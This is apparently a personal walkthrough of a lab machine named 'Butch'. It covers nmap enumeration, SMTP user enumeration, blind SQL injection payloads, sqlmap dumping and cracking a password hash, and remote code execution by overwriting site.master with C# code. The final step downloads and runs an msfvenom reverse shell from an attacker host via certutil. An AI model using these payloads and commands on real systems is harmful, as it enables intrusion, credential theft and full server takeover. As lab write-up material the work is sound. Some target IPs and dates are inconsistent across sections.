> Noamro08 - 17 Feb 2024
### Target: 192.168.159.63

---
## Enumeration:
nmap scan for services, default scripts:
```bash
nmap -Pn -n -A 192.168.159.63 -oN initial.scan 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 16:54 IST
Nmap scan report for 192.168.159.63
Host is up (0.082s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
25/tcp  open  smtp          Microsoft ESMTP 10.0.17763.1
| smtp-commands: butch Hello [192.168.45.221], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-17T14:55:18
|_  start_date: N/A
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

nmap scan for all ports:
```bash
nmap -Pn -n -p- 192.168.159.63 --min-rate=5000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 16:52 IST
Nmap scan report for 192.168.159.63
Host is up (0.085s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
450/tcp  open  tserver
5985/tcp open  wsman
```

ftp anonymous login doesnot working, for smb we also need valid user and password from smtp we can enumerate users with 'smtp-user-enum':
```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.159.63

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Target count ............. 1
Username count ........... 17
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Feb 17 17:20:51 2024 #########
192.168.159.63: info exists
192.168.159.63: guest exists
192.168.159.63: admin exists
192.168.159.63: root exists
192.168.159.63: test exists
192.168.159.63: adm exists
192.168.159.63: user exists
192.168.159.63: administrator exists
192.168.159.63: mysql exists
192.168.159.63: oracle exists
192.168.159.63: ftp exists
192.168.159.63: pi exists
192.168.159.63: puppet exists
192.168.159.63: ansible exists
192.168.159.63: ec2-user exists
192.168.159.63: azureuser exists
192.168.159.63: vagrant exists
```

on port 450 we can see it is an IIS http server: 
```bash
nmap -Pn -n -sVC -p 450 192.168.159.63                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 17:26 IST
Nmap scan report for 192.168.159.63
Host is up (0.081s latency).

PORT    STATE SERVICE VERSION
450/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Butch
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
browsing this site there is login page.

the username is vulnerable to sqli:
![[Pasted image 20240217180218.png]]

we understand it is a blind sqli, wo we try to use the 'WAITFOR DELAY' command to validate success of our SQL commands.
`'; IF (1=1) WAITFOR DELAY '0:0:10' -- -`
![[Pasted image 20240217180514.png]]
it works the server waited for 10 seconds.

so now we can query the server yes/no questions trying to substract password:

`'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:5' -- -`
with this payload we get that the tables is 'users':
![[Pasted image 20240217180826.png]]

using sqlmap to get the databases:
```bash
sqlmap -r /home/kali/butch_request --dbms mssql --dbs
        ___
       __H__                                                                                                          
 ___ ___[.]_____ ___ ___  {1.4.10#stable}                                                                             
|_ -| . [']     | .'| . |                                                                                             
|___|_  [']_|_|_|__,|  _|                                                                                             
      |_|V...       |_|   http://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

...

[21:58:57] [INFO] POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable                                                                               
[21:58:57] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[21:59:08] [INFO] POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' appears to be 'Microsoft SQL Server/Sybase time-based blind (IF)' injectable

...

available databases [5]:
[*] master
[*] model
[*] msdb
[*] tempdb
[*] butch

[22:02:28] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[22:02:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.65.63'

[*] ending @ 22:02:28 /2020-12-22/
```

lets dump butch database:
```bash
sqlmap -r /home/kali/butch_request --dbms mssql -D butch --dump
        ___
       __H__                                                                                                          
 ___ ___[,]_____ ___ ___  {1.4.10#stable}                                                                             
|_ -| . [']     | .'| . |                                                                                             
|___|_  [.]_|_|_|__,|  _|                                                                                             
      |_|V...       |_|   http://sqlmap.org                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

...

Database: butch
Table: users
[1 entry]
+---------+----------+------------------------------------------------------------------+
| user_id | username | password_hash                                                    |
+---------+----------+------------------------------------------------------------------+
| 1       | butch    | e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 |
+---------+----------+------------------------------------------------------------------+
```
Since the output contained a password hash, sqlmap offers to attempt to crack the hash with a common wordlist. We'll respond with Y or yes to proceed.

The attempt is successful, revealing a password of awesomedude. We can successfully authenticate to the web app with this password.

**butch: awesomedude**

### Application Analysis
This authentication grants us access to a page that allows file uploads. However, attempting to upload an .aspx or .asp web shell results in an error, suggesting these file types are blacklisted.

As we attempt to upload other types of files, we discover that we can upload .txt files and, once uploaded, they are accessible from the web root. For example, if we were to upload a file named test.txt, we could access it at http://192.168.65.63:450/test.txt.

In our previous enumeration, we discovered a /dev directory. Navigating to this directory reveals two files: style.css and site.master.txt. The CSS file in uninteresting for our purposes, but the TXT file contains very useful information.
```
<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
	<head runat="server">
		<title>Butch</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="application-name" content="Butch">
		<meta name="author" content="Butch">
		<meta name="description" content="Butch">
		<meta name="keywords" content="Butch">
		<link media="all" href="style.css" rel="stylesheet" type="text/css" />
		<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
	</head>
	<body>
		<div id="wrap">
			<div id="header">Welcome to Butch Repository</div>
			<div id="main">
				<div id="content">
					<br />
					<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
					<br />
				</div>
			</div>
		</div>
	</body>
</html>
```
The official Microsoft documentation for site.master (https://docs.microsoft.com/en-us/previous-versions/wtxbf3hh(v=vs.140)?redirectedfrom=MSDN) indicates that this file provides a template for every page on an ASP.NET MVC-style application.

The file indicates that this webpage uses C# as a backend language, uses a site.master file as a template and often resides in the web root. This file can also contain arbitrary code, which is not mentioned in the Microsoft documentation. LEt's try to take advantage of that.

### RCE
Let's review what we have discovered. First, it seems that the site.master file resides in the web root. We also know that we can upload files to the web root. By extension, we we may be able to overwrite the site.master file with our own version, which could contain embedded code. If this overwrite is successful, we could reload the web page and our code may execute, giving us remote code execution.

We're ready to create a proof of concept exploit.

We'll begin by crafting a new site.master file. We'll include the existing contents from the original file and append arbitrary C# code which outputs the name of the user that is running the web application:
```
<%
string stdout = "";
string cmd = "whoami";
System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
procStartInfo.RedirectStandardOutput = true;
procStartInfo.UseShellExecute = false;
procStartInfo.CreateNoWindow = true;
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo = procStartInfo;
p.Start();
stdout = p.StandardOutput.ReadToEnd();
Response.Write(stdout);
%>
```
adding this to the default 'site.master' file.

uploading this and refresh the page we can see the user that runs this RCE:
![[Pasted image 20240217225158.png]]
This indicates that the application is running as SYSTEM. Exploiting this application could give us full control of the server!

### Getting Reverse Shell
Now that we know we can execute arbitrary code on the server with this approach, let's attempt to get a remote shell.

We'll modify our code at the bottom of our file as follows:
```
<%
string stdout = "";
ArrayList commands = new ArrayList();
commands.Add("certutil.exe -urlcache -split -f \"http://192.168.49.65:445/shell.exe\" \"C:\\inetpub\\wwwroot\\shell.exe\"");
commands.Add("\"C:\\inetpub\\wwwroot\\shell.exe\"");
foreach (string cmd in commands) {
	System.Threading.Thread.Sleep(3000);
	System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
	procStartInfo.RedirectStandardOutput = true;
	procStartInfo.UseShellExecute = false;
	procStartInfo.CreateNoWindow = true;
	System.Diagnostics.Process p = new System.Diagnostics.Process();
	p.StartInfo = procStartInfo;
	p.Start();
	stdout = p.StandardOutput.ReadToEnd();
	Response.Write(stdout);
}
%>
```

Once run, this code will instruct the server to connect to a web server (that we control), download a reverse shell and execute it. Let's create our reverse shell with msfvenom:
```bash
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.65 LPORT=450 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

Next, we'll start a web server to host the reverse shell.
```
root@kali~# sudo python3 -m http.server 445
Serving HTTP on 0.0.0.0 port 445 (http://0.0.0.0:445/) ...
```
Finally, let's start a Netcat listener to catch our shell:
```
kali@kali:~$ sudo nc -lvp 450
listening on [any] 450 ...
```
now uploading this file and refresh the page gets us the rev shell:
![[Pasted image 20240217225448.png]]

